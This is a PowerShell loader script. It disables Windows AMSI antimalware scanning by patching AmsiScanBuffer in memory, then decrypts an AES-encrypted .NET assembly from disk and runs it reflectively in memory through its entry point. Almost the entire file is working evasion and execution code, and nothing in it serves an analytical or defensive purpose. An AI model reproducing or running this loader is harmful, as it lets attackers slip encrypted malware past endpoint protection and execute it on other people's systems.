# Decrypt-And-Execute-Reflective.ps1

param (
    [Parameter(Mandatory = $true)]
    [string]$location,

    [Parameter(Mandatory = $true)]
    [string]$password,

    [string]$argument,
    [string]$argument2,
    [string]$argument3,

    [Switch]$noArgs
)

# ---- AMSI Bypass Using LoadLibrary, GetProcAddress, and VirtualProtect ----
function Bypass-AMSI {
    try {
        $UnsafeNativeMethods = @"
using System;
using System.Runtime.InteropServices;

public class UnsafeNativeMethods
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void PatchAMSI()
    {
        byte[] patch;
        if (IntPtr.Size == 8) // x64
            patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        else // x86
            patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@

        Add-Type -TypeDefinition $UnsafeNativeMethods -Language CSharp
        [UnsafeNativeMethods]::PatchAMSI()
        Write-Host "[*] AMSI bypass applied successfully!"
    }
    catch {
        Write-Host "[x] AMSI Bypass Failed: $_"
    }
}
Bypass-AMSI  # Execute AMSI bypass

try {
    # Read the encrypted file
    if (-Not (Test-Path $location)) {
        throw "File not found: $location"
    }

    $CombinedBytes = [IO.File]::ReadAllBytes($location)
    if ($CombinedBytes.Length -lt 16) {
        throw "Encrypted file is too short to contain a valid IV."
    }

    # Extract IV and encrypted data
    $IV = $CombinedBytes[0..15]
    $EncryptedBytes = $CombinedBytes[16..($CombinedBytes.Length - 1)]

    # Generate the decryption key using SHA256
    $Key = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))

    # Decrypt the bytes using AES with explicit padding handling
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = $Key
    $Aes.IV = $IV
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7  # Ensure proper padding handling
    $Decryptor = $Aes.CreateDecryptor()

    try {
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
    }
    catch {
        Write-Host "[ERROR] Decryption failed: The provided password is incorrect or the encrypted file is corrupted."
        Write-Host "[HINT] Ensure the password is correct and matches the one used during encryption."
        Write-Host "[HINT] If the file was transmitted or modified, it might be corrupted."
        exit 1
    }

    # ---- Fix for "Incorrect Format" Error ----
    if ([System.BitConverter]::ToUInt16($DecryptedBytes, 0) -ne 0x5A4D) {
        throw "[ERROR] Decrypted binary is not a valid PE file (incorrect format)."
    }

    # Load the decrypted assembly into memory
    $Assembly = [System.Reflection.Assembly]::Load($DecryptedBytes)
    if ($Assembly -eq $null) {
        throw "[ERROR] Failed to load assembly from decrypted bytes."
    }

    # Get the entry point of the assembly
    $EntryPoint = $Assembly.EntryPoint
    if ($EntryPoint -eq $null) {
        throw "[ERROR] No entry point found in the assembly."
    }

    # Debugging: Print EntryPoint Method Info
    Write-Host "Entry Point: $($EntryPoint.Name)"
    Write-Host "Parameter Count: $($EntryPoint.GetParameters().Count)"
    foreach ($param in $EntryPoint.GetParameters()) {
        Write-Host "Parameter Type: $($param.ParameterType)"
    }

    # Construct the argument array based on provided parameters
    $ExeArgs = @()

    if ($noArgs) {
        Write-Host "[*] Running with NO arguments."
        $ExeArgs = @("")
    }
    elseif ($argument3) {
        Write-Host "[*] Running with three arguments: $argument, $argument2, $argument3"
        $ExeArgs = @($argument, $argument2, $argument3)
    }
    elseif ($argument2) {
        Write-Host "[*] Running with two arguments: $argument, $argument2"
        $ExeArgs = @($argument, $argument2)
    }
    elseif ($argument) {
        Write-Host "[*] Running with one argument: $argument"
        $ExeArgs = @($argument)
    }
    else {
        Write-Host "[*] Running with only blank dummy arguments."
        $ExeArgs = @("")
    }

    # Convert to a strict C# string[] array
    $validArgs = [string[]]$ExeArgs

    # Pass the `string[]` as a SINGLE argument
    $EntryPoint.Invoke($null, (, $validArgs))
}
catch {
    Write-Error "Error encountered: $_"
}
